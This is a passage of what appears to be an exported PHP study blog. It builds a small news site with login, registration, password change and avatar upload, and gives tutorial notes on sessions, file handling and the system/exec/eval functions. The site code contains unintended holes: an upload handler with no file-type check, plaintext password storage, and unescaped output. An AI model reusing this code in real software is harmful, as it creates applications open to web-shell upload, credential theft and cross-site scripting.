&apos;r&apos;); $transArr = array(); while(!feof($fhandle))&#123; $fline = fgets($fhandle); $tmpLine = explode(&apos;||&apos;, $fline); if($tmpLine[0] == $id)&#123; continue; &#125; array_push($transArr, $tmpLine); &#125; fclose($fhandle); for($i=0; $i&lt;count($transArr); $i++) &#123; echo &quot;&lt;br&gt;&quot;; &#125; echo &quot;&lt;br&gt;&quot;; $fhandle = fopen(&apos;../data/news1.db&apos;, &apos;w&apos;); for($i=0; $i&lt;count($transArr); $i++) &#123; if(count($transArr[$i])==7) &#123; $transArr[$i][0] = $i + 1; $str = implode(&apos;||&apos;, $transArr[$i]); if($str==&quot;\n&quot;)&#123; continue; &#125; fputs($fhandle, $str); &#125; &#125; if(isset($_POST[&apos;id&apos;])) &#123; if (count($transArr) == computerId(&apos;../data/news1.db&apos;)) &#123; echo &quot;&lt;script&gt;alert(&apos;删除成功&apos;); location.href=&apos;../tmp/del.php&apos;;&lt;/script&gt;&quot;; &#125; &#125; fclose($fhandle);?&gt;&lt;?php include &quot;../basedir/footer.php&quot;;?&gt; 添加好新闻后，点击删除新闻可以进入删除新闻界面 3. 修改密码getpasswd.php 1234567891011121314151617181920&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;&lt;div align=&quot;center&quot;&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) &#123; echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;请登录&quot;); &#125; ?&gt; &lt;a href=&quot;upload.php&quot;&gt;上传头像&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;../data/addNews.php&quot;&gt;添加新闻&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;del.php&quot;&gt;删除新闻&lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;checkpass.php&quot; method=&quot;post&quot;&gt; &lt;label&gt;输入旧密码：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;oldpasswd&quot;&gt; &lt;label&gt;输入新密码：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;newpasswd&quot;&gt; &lt;label&gt;确认密码：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;checknewpasswd&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;?php include &quot;../basedir/footer.php&quot;;?&gt; checkpass.php 思路：先把每行数据读出存到一个数组里，用户名匹配成功后，先判断oldpass是否正确，不正确则返回，重新输入，若匹配成功，再判断newpasswd和checknewpasswd是否一致，不一致返回，重新输入，一致的话，把该用户的密码改成新密码后入栈。最后处理完的数据写入文件中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php session_start(); if($_SESSION[&apos;uname&apos;]==NULL) &#123; echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;请登录&quot;); &#125; if($_POST[&apos;oldpasswd&apos;]==NULL &amp;&amp; $_POST[&apos;newpasswd&apos;]==NULL &amp;&amp; $_POST[&apos;checknewpasswd&apos;]==NULL)&#123; echo &quot;&lt;script&gt;alert(\&quot;密码不能为空\&quot;); history.back();&lt;/script&gt;&quot;; &#125; $tmparr = array(); $userPasswd = array(); $oldpass = $_POST[&apos;oldpasswd&apos;]; $newpass = $_POST[&apos;newpasswd&apos;]; $checknew = $_POST[&apos;checknewpasswd&apos;]; $fhandle = fopen(&apos;../data/user1.db&apos;, &apos;r&apos;); while(!feof($fhandle)) &#123; $line = fgets($fhandle); $lineArr = explode(&apos;||&apos;, $line); if ($lineArr[0] == $_SESSION[&apos;uname&apos;]) &#123; $userPasswd[0] = $lineArr[0]; $userPasswd[1] = $newpass.&quot;\n&quot;; $checkold = $lineArr[1]; array_push($tmparr, $userPasswd); continue; &#125; array_push($tmparr, $lineArr); &#125; fclose($fhandle); if(trim($checkold)!=$oldpass)&#123; echo &quot;&lt;script&gt;alert(\&quot;密码不正确！\&quot;)&lt;/script&gt;&quot;; &#125;else &#123; if ($newpass == $checknew) &#123; $fhandle = fopen(&apos;../data/user1.db&apos;, w); for ($i = 0; $i &lt; count($tmparr); $i++) &#123; $str = implode(&apos;||&apos;, $tmparr[$i]); echo $str; echo &quot;&lt;br&gt;&quot;; fputs($fhandle, $str); &#125; fclose($fhandle); echo &quot;&lt;script&gt;alert(\&quot;密码修改成功，请重新登录！\&quot;)&lt;/script&gt;&quot;; //echo &quot;&lt;script&gt;location.href=&apos;../logout.php&apos;&lt;/script&gt;&quot;; &#125;else&#123; echo &quot;&lt;script&gt;alert(\&quot;新密码不匹配，请重新输入！\&quot;)&lt;/script&gt;&quot;; &#125; &#125;?&gt; 修改密码界面： 密码修改后登出账号，重新登录。 五、上传头像 upload.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php include &apos;../basedir/function.php&apos;; include &apos;../basedir/header.php&apos;; ?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;上传图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?phpif($_SESSION[&apos;uname&apos;]==NULL) echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;?&gt;&lt;div align=&quot;center&quot;&gt; &lt;a href=&quot;del.php&quot;&gt;删除新闻&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;../data/addNews.php&quot;&gt;添加新闻&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;getpasswd.php&quot;&gt;修改密码&lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; &gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif(isset($_POST[&apos;submit&apos;]))&#123; $name = $_FILES[&apos;file&apos;][&apos;name&apos;]; $temp_name = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;]; if(isset($name))&#123; if(!empty($name))&#123; $location = &quot;../upload/&quot;; $path = $location . $name; if(move_uploaded_file($temp_name, $location.$name))&#123; $_SESSION[&apos;headImg&apos;] = $path; echo &apos;File uploaded successfully&apos;; echo &lt;&lt;&lt;EOF &lt;div align=&quot;center&quot;&gt; &lt;img src=$path&gt; &lt;/div&gt;EOF; &#125; &#125; &#125; else &#123; echo &apos;You should select a file to upload !!&apos;; &#125;&#125;?&gt;&lt;?php include &apos;../basedir/footer.php&apos;?&gt; 上传头像界面： 六、退出账号 logout.php12345&lt;?phpsession_start();session_destroy();echo &quot;&lt;script&gt;alert(&apos;账号已退出&apos;); location.href=&apos;login.html&apos;&lt;/script&gt;&quot;?&gt; 在任何一个界面点击注销账号均能成功退出，重新返回用户登录界面 点击确定，返回用户登录界面。 七、问题与总结 目前的代码有些冗余，比如删除新闻和修改密码，都是把需要的信息读取出来，然后稍作处理再写回文件，可以在function.php文件里写一个函数，需要时直接调用函数就行；删除新闻界面和初始化界面都有展示新闻的功能，也可可以通过一个函数来实现展示。 对写入文件的内容判断不严谨，会把\n写入，文件内容间有空行时，统计总的id数会把空行也给统计进去，进而导致删除新闻时，不成功。把空行删完以后，才会执行成功。目前对文件操作\n理解不深，正在寻找方法解决。 代码移植性差，需要修改地方较多。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note20]]></title>
    <url>%2F2019%2F08%2F09%2Fnote20%2F</url>
    <content type="text"><![CDATA[Abstract: 新闻界面添加新功能讲解，PHP中的Cookie和Session以及程序执行函数 一、PHP Cookiecookie常用于识别用户，是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送cookie。 1. 如何创建Cookiesetcookie()函数用于设置cookie setcookie()函数必须位于&lt;html&gt;标签之前 12345678&lt;?php/*setcookie(name, value, expire, path, domain)发送cookie时，cookie值会自动进行URL编码取回时进行自动解码*/setcookie(&quot;user&quot;, &quot;test&quot;, time()+3600);?&gt; 2. 取回Cookie值123456&lt;?php//输出cookie值echo $_COOKIE[&quot;user&quot;];//查看所有cookieprint_r($_COOKIE);?&gt; 1234567891011121314&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;isset函数&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if(isset($_COOKIE[&quot;user&quot;])) echo &quot;欢迎&quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;; else echo &quot;普通访客！&lt;br&gt;&quot;; ?&gt; &lt;/body&gt;&lt;/html&gt; 3. 删除Cookie1234&lt;?php//设置cookie过期时间为过去1小时setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt; 二、PHP SessionPHP session变量用于存储关于用户会话（session）信息，或者更改用户会话的设置，Session变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 1. 开始PHP Session12345&lt;!--session_start()函数必须位于&lt;html&gt;标签之前--&gt;&lt;?php session_start(); ?&gt;&lt;html&gt; &lt;body&gt;&lt;/body&gt;&lt;/html&gt; 2.存储Session变量1234567891011121314151617&lt;?php session_start();//存储session数据$_SESSION[&apos;views&apos;]=1;?&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Session&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php //检索session数据 echo &quot;浏览量：&quot; . $_SESSION[&apos;views&apos;]; ?&gt; &lt;/body&gt;&lt;/html&gt; 一个简单的page-view计数器 123456789&lt;?phpsession_start();if(isset($_SESSION[&apos;views&apos;]))&#123; $_SESSION[&apos;views&apos;] = $_SESSION[&apos;views&apos;] + 1;&#125;else&#123; $_SESSION[&apos;views&apos;] = 1;&#125;echo &quot;浏览器：&quot; . $_SESSION[&apos;views&apos;];?&gt; 3. 销毁Sessionunset() 123456&lt;?phpsession_start();if(isset($_SESSION[&apos;views&apos;]))&#123; unset($_SESSION[&apos;views&apos;]);&#125;?&gt; session_destroy() 123&lt;?phpsession_destroy();?&gt; 验证登录用户是否由admin权限 12345678910&lt;?phpsession_start();if(isset($_SESSION[&quot;admin&quot;]) &amp;&amp; $_SESSION[&quot;admin&quot;]== true)&#123; echo &quot;您已成功登录&quot;;&#125;else&#123; //验证失败 $_SESSION[&quot;admin&quot;] = false; die(&quot;您无权访问&quot;);&#125;?&gt; 三、PHP包含文件 语句 区别（处理错误方式不同） require 生成一个致命错误(E_COMPILE_ERROR)，在错误发生后脚本停止执行 include 生成一个警告(E_WARNING)，在错误发生后脚本会继续执行 语法 include &#39;filename&#39;; require &#39;filename&#39; 写一些功能性的函数，比如数据库查询，验证文件后缀是否是允许的。数据库删除，数据清洗waf 写配置信息，数据库连接地址，网站标题，网站作者 统一页面格式 做路由控制 四、PHP中程序执行函数1. systemsystem —执行外部程序，并且显示输出 system(command, return var) 12345&lt;?phpsystem(&quot;pwd&quot;, $result);//输出命令的结果状态码echo $result;?&gt; 2. execexec—执行一个外部程序 123&lt;?phpecho exec(&quot;whoami&quot;);?&gt; 3. shellexecshellexec—通过shell环境执行命令并且将完整的输出以字符串的方式返回。 1234&lt;?php$output = shell_exec(&apos;ls -lart&apos;);echo $output;?&gt; 4. evaleval把字符串按照php代码来计算 12345678&lt;?php$string = &apos;cup&apos;;$name = &apos;coffee&apos;;$str = &apos;This is a $string with my $name in it.&apos;;echo $str . &quot;\n&quot;;eval(&quot;\$str = \&quot;$str\&quot;;&quot;);echo $str . &quot;\n&quot;;?&gt; 5. assertassert检查一个断言是否为FALSE]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习4]]></title>
    <url>%2F2019%2F08%2F09%2Fpractice4%2F</url>
    <content type="text"><![CDATA[Abstract: 新闻界面新增用户登录和注册功能，以及在编写过程中遇到的问题与解决 一、用户登录1.用户登录界面 signin.php123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt; &lt;title&gt; 登录 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h1 align=&quot;center&quot;&gt;登录&lt;/h1&gt;&lt;div align=&quot;center&quot;&gt; &lt;br&gt; &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;tel&quot; name=&quot;phonenumber&quot; placeholder=&quot;手机号&quot;&gt; &lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;a href=&quot;signup.php&quot;&gt;注册账号&lt;/a&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;br&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.账号和密码处理 login.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;html&gt;&lt;head&gt; &lt;title&gt; 处理账号和密码 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php//打开存储用户信息的文件$fhandle = fopen(&apos;./data/users.db&apos;, &apos;r&apos;);//逐行读取数据while(!feof($fhandle)) &#123; $InMes = fgets($fhandle); $mesArray = explode(&apos;||&apos;, $InMes); if(count($mesArray)!=2)&#123; continue; &#125; if(trim($mesArray[0])==$_POST[&apos;phonenumber&apos;] &amp;&amp; trim($mesArray[1])==$_POST[&apos;password&apos;])&#123; echo &quot;正在进入后台&quot;; echo &lt;&lt;&lt;EOF &lt;script&gt;location.href=&quot;./data/add_news.php&quot;&lt;/script&gt;EOF; break; &#125; $flag = 1;// else&#123;// echo &quot;&lt;script&gt;alert(&apos;账号或密码错误！重新输入。&apos;)&lt;/script&gt;&quot;;// echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;// &#125;&#125;//修改逻辑问题if($flag==1)&#123; echo &quot;&lt;script&gt;alert(&apos;账号或密码错误！重新输入。&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 逻辑问题：注释掉的是第一次写完的，但判断逻辑是有问题的，逐行读取用户信息后，相同则跳回增加新闻界面，否则提示错误信息，重新输入账号或密码，这样会导致用户信息没有匹配成功前会一直报错。 解决方法：在用户读完文件前不做出错判断，读完再判断，在判断匹配成功语句后添加一个标志位flag若值为1说明用户没有匹配成功，直接报错。，返回用户登录界面重新输入密码。 格式问题：用户账号和密码匹配时一直匹配不对。 解决方法：用var_dump把数据输出发现是相同的，但还是匹配不成功，想想有可能需要用trim函数处理下数据。 二、用户注册1.用户注册界面 signup.php12345678910111213141516171819202122&lt;html&gt;&lt;head&gt; &lt;title&gt; 注册账号 &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div align=&quot;center&quot;&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h2 align=&quot;center&quot;&gt;注册用户&lt;/h2&gt; &lt;form action=&quot;./checkSignUp.php&quot; method=&quot;post&quot;&gt; 手机：&lt;input type=&quot;tel&quot; name=&quot;phonenumber&quot;placeholder=&quot;手机号&quot;&gt; &lt;br&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; 确认：&lt;input type=&quot;password&quot; name=&quot;checkpasswd&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.用户注册数据处理1234567891011121314&lt;?php$fhandle = fopen(&apos;./data/users.db&apos;, &apos;a+&apos;);$userMes = array();@$userMes[0] = $_POST[&apos;phonenumber&apos;];@$userMes[1]=$_POST[&apos;password&apos;];$inMes = implode(&apos;||&apos;, $userMes);// var_dump($inMes);if(count($userMes)==2) &#123; fputs($fhandle, $inMes . &quot;\n&quot;); fclose($fhandle); echo &quot;&lt;script&gt;alert(&apos;用户注册成功&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;location.href=&apos;signin.php&apos;&lt;/script&gt;&quot;;&#125;?&gt; 注册成功自动跳转到用户登录界面 三、添加新闻界面 add_news.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;增加新闻&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;add_news.php&quot; method=&quot;post&quot;&gt; 标号：&lt;input type=&quot;number&quot; name=&quot;id&quot;&gt;&lt;br&gt; 标题：&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;!-- 标题：&lt;input type=&quot;text&quot; namne=&quot;title&quot;&gt;&lt;br&gt;--&gt; 内容：&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt; 日期：&lt;input type=&quot;date&quot; name=&quot;date&quot;&gt;&lt;br&gt; 作者：&lt;input type=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br&gt; 热度：&lt;input type=&quot;number&quot; name=&quot;hot&quot;&gt;&lt;br&gt; 图片：&lt;input type=&quot;url&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php $fhandle = fopen(&apos;news.db &apos;, &apos;a&apos;); $arrMes = array(); @$arrMes[0] = $_POST[&apos;id&apos;]; @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]); @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]); @$arrMes[3] = $_POST[&apos;date&apos;]; @$arrMes[4] = base64_encode($_POST[&apos;author&apos;]); @$arrMes[5] = $_POST[&apos;hot&apos;]; @$arrMes[6]= $_POST[&apos;imgUrl&apos;]; if($arrMes[0]!=NULL) &#123; $writeMes = implode(&apos;||&apos;, $arrMes); //echo $writeMes; $fline = fputs($fhandle, &quot;\n&quot;.$writeMes); if($fline!=flase)&#123; echo &quot;&lt;script&gt;alert(\&quot;新闻添加成功！\&quot;)&lt;/script&gt;&quot;; echo &quot;&lt;a href=&apos;../index.php&apos;&gt;点击查看&lt;/a&gt;&quot;; &#125; &#125; fclose($fhandle);?&gt;&lt;script&gt; function alertInfo()&#123; alert(&quot;新闻添加成功！&quot;) &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 四、展示新闻界面 index.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;h1 align=&quot;center&quot;&gt;ICQ新闻中心&lt;/h1&gt;&lt;hr&gt;&lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;热度&lt;/th&gt; &lt;th&gt;标题&lt;/th&gt; &lt;th&gt;作者&lt;/th&gt; &lt;th&gt;时间&lt;/th&gt; &lt;th&gt;素质三联&lt;/th&gt; &lt;/tr&gt; &lt;?php //用只读方式打开news.db文件 $fhandle = fopen(&quot;./data/news.db&quot;, &quot;r&quot;); //设置一个计数器，小于3时，每个文章标题下面增加图片和简介 $top3Cnt=1; while(!feof($fhandle)) &#123; $fline = fgets($fhandle); $data = explode(&apos;||&apos;, $fline); @$title = base64_decode($data[1]); @$content = base64_decode($data[2]); @$date = $data[3]; @$author = base64_decode($data[4]); @$hot = $data[5]; @$imgUrl = $data[6]; echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$hot&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;td&gt;$date&lt;/td&gt; &lt;td&gt;&lt;button&gt;👍&lt;/button&gt;/&lt;button&gt;👎&lt;/button&gt;&lt;/td&gt; &lt;/tr&gt;EOF; if($top3Cnt&lt;=3)&#123; $tmpContent = mb_substr(base64_decode($data[2]), 0,50); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt; &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;内容简介：&lt;/b&gt;$tmpContent&lt;/td&gt; &lt;/tr&gt;EOF; &#125; $top3Cnt++; &#125; ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note19]]></title>
    <url>%2F2019%2F08%2F08%2Fnote19%2F</url>
    <content type="text"><![CDATA[Abstract: PHP中文件和文件夹操作常用函数以及文件上传功能的介绍和应用，对新闻界面添加用户登录注册界面等。 一、文件和文件夹操作常用函数1. 文件内容操作 函数名 作用 fopen() 打开文件或URL fread() 读取打开的文件 fgets() 从打开的文件中返回一行 fputs()/fwrite() 写入打开的文件 copy() 复制文件 fclose() 关闭打开的文件 file_get_contents() 把文件读入字符串 file_put_contents() 把字符串写文件 basename() 返回路径中文件名部分 filesize() 返回文件大小 fread(handle, length)/filesize(filesize)/copy(file, to_file) 1234567&lt;?php $file = fopen(&quot;test.txt&quot;, &quot;r&quot;); $contents = fread($file, &quot;10&quot;); $size = filesize(&quot;test.txt&quot;); echo copy(&quot;source.txt&quot;, &quot;target.txt&quot;); fclose($file);?&gt; basename(path,suffix) 1234567&lt;?php$path = &quot;/testweb/home.php&quot;;//home.phpecho basename($path) . &quot;&lt;br&gt;&quot;;//homeecho basename($path, &quot;.php&quot;);?&gt; file_get_contents(path, include_path, context, start, max_length) 12345&lt;?php//This is a test file with test textecho file_get_contents(&quot;test.txt&quot;);?&gt; file_put_contents()函数：成功返回写入文件的字符数，失败则返回False 12345678910111213&lt;?php// 6echo file_put_contents(&quot;sites.txt&quot;, &quot;Runoob&quot;);$file = &apos;sites.txt&apos;; $site = &quot;\nGoogle&quot;;// 向文件追加写入内容// 使用 FILE_APPEND 标记，可以在文件末尾追加内容// LOCK_EX 标记可以防止多人同时写入file_put_contents($file, $site, FILE_APPEND | LOCK_EX);?&gt; 2.文件操作 函数名 作用 file_exists() 检查文件或目录是否存在 filetype() 返回文件类型 is_dir() 判断文件是否是一个目录 is_file() 判断文件是否是常规的文件 mkdir() 创建目录 rename() 重命名文件或目录 rmdir() 删除空的目录 unlink() 删除文件 file_exists(path) 1234&lt;?php// 1echo file_exists(&quot;test.txt&quot;)?&gt; filetype(filename) 1234567&lt;?php// fifo char dir block link file unknown//fileecho filetype(&quot;test.txt&quot;);//direcho filetype(&quot;images&quot;);?&gt; 二、文件上传1. 创建一个文件上传表单12345678910111213&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="upload_file.php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;文件名：&lt;/label&gt; &lt;input type="file" name="file" id="file"&gt;&lt;br&gt; &lt;input type="submit" name="submit" value="提交"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; &lt;form&gt;标签的enctype属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，使用multipart/form-data。 &lt;input&gt;标签type=&quot;file&quot;属性规定了应该把输入作为文件来处理。 2. 创建上传脚本 upload_file.php123456789101112131415&lt;?php if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)&#123; //由文件上传导致的错误代码 echo &quot;错误&quot; .$_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; //上传文件的名称 echo &quot;上传文件名：&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; //上传文件的类型 echo &quot;文件类型：&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; //上传文件的大小 echo &quot;文件大小：&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;; //存储在服务器的文件临时副本的名称 echo &quot;文件临时存储位置：&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; &#125;?&gt; 3. 上传限制123456789101112131415161718192021222324252627282930&lt;?php//允许上传图片后缀$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);$temp = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);//获取文件后缀名$extension = end($temp);if((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800) &amp;&amp; (in_array($extension, $allowedExts)))&#123; if($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; //上传文件的名称 echo &quot;上传文件名：&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; //上传文件的类型 echo &quot;文件类型：&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; //上传文件的大小 echo &quot;文件大小：&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;; //存储在服务器的文件临时副本的名称 echo &quot;文件临时存储位置：&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; &#125;&#125;else&#123; echo &quot;非法文件的格式&quot;;&#125;?&gt; 4. 保存被上传的文件12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php//允许上传图片后缀$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);$temp = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);//获取文件后缀名$extension = end($temp);if((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800) &amp;&amp; (in_array($extension, $allowedExts)))&#123; if($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; //上传文件的名称 echo &quot;上传文件名：&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; //上传文件的类型 echo &quot;文件类型：&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; //上传文件的大小 echo &quot;文件大小：&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;; //存储在服务器的文件临时副本的名称 echo &quot;文件临时存储位置：&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; //判断当前目录下的upload目录是否存在该文件 //如果没有upload目录，需要创建它，upload目录权限为777 if(file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;文件已经存在&quot;; &#125;else&#123; //如果upload目录不存在该文件则将文件上传到upload目录下 move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;文件存储在：&quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;&#125;else&#123; echo &quot;非法文件的格式&quot;;&#125;?&gt; 关于上传文件的起名常常加上时间戳。]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
